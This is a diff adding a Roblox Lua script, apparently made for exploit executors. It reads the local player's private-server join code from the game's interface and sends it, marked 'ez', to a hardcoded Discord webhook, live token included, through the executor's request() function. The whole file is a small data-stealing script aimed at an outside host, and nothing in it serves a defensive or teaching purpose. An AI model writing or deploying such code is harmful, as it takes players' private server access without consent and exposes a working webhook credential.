@@ -1,0 +1,44 @@
+local webhookUrl = "https://discord.com/api/webhooks/1485058037810204742/Zd_CJCembXCpu2agG9yoHufmhE_FAEITA9djlvvlDgOo8CzaClZvVCbfekSzQr6gOLXH"
+
+local function getJoinCode()
+    local player = game:GetService("Players").LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
+    local privatserverInfo = playerGui:FindFirstChild("Privatserver_Info")
+    
+    if not privatserverInfo then return "Error: GUI not found" end
+    
+    local joinCodeLabel = privatserverInfo:FindFirstChild("PrivatserverInfo")
+        and privatserverInfo.PrivatserverInfo:FindFirstChild("Body")
+        and privatserverInfo.PrivatserverInfo.Body:FindFirstChild("ServerInfo")
+        and privatserverInfo.PrivatserverInfo.Body.ServerInfo:FindFirstChild("JoinCode")
+    
+    if joinCodeLabel then
+        return joinCodeLabel.Text
+    end
+    return "Error: JoinCode not found"
+end
+
+local joinCode = getJoinCode()
+--("Join Code: " .. joinCode)
+
+-- Try different HTTP methods depending on executor
+local success = false
+
+-- Method 2: Some executors have global request function
+if not success and request then
+    pcall(function()
+        request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode({content = "ez" .. joinCode})
+        })
+        success = true
+        print("Sent via request()")
+    end)
+end
+
+
+if not success then
+-- ee
+end
